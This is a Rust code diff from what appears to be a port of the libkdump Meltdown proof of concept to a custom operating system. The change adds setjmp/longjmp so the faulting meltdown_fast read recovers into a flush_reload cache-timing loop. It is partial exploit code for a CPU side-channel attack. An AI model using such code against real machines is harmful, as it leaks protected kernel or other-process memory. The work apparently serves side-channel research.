@@ -15,6 +15,11 @@ use syscall::SystemCall::SignalHandlerRegister;
 
 use core::arch::asm;
 
+use sjlj::{setjmp, longjmp, JumpBuf};
+use spin::{Mutex};
+
+static jump_buf: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
+
 const PAGE_SIZE: usize = 256;
 
 #[derive(Copy, Clone, Debug)] // Required to initialize an entire array with such objects
@@ -96,24 +101,24 @@ impl SignalHandler for SegfaultHandler {
 	}
 }
 
-// Debugging only
-#[unsafe(no_mangle)]
+// Debugging only, to be replaced by a struct with SignalHandler trait
 pub fn handle_signal() {
-	println!("Handling signal. This means we successfully jumped back into userspace!");
-}
-
-#[unsafe(no_mangle)]
-pub fn dummy_function() {
-	println!("This is a dummy function!");
+	unsafe {
+		longjmp(&mut *jump_buf.lock(), 1);
+	}
 }
 
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	for _ in 0..config.retries {
 		// TODO: Set segmentation fault callback position
-		dummy_function();
-		//println!("Executing meltdown_fast. This will cause a segmentation fault.");
-		meltdown_fast(mem, pointer);
-			
+		unsafe {
+			if setjmp(&mut *jump_buf.lock()) == 0 {
+				meltdown_fast(mem, pointer);
+			} else {
+				jump_buf.force_unlock();
+			}
+		}
+		
 		for i in 0..mem.len() {
 			if flush_reload(cache_miss_threshold, &mem[i] as *const MemoryPage) {
 				if i >= 1 { // TODO why ignore first entry?
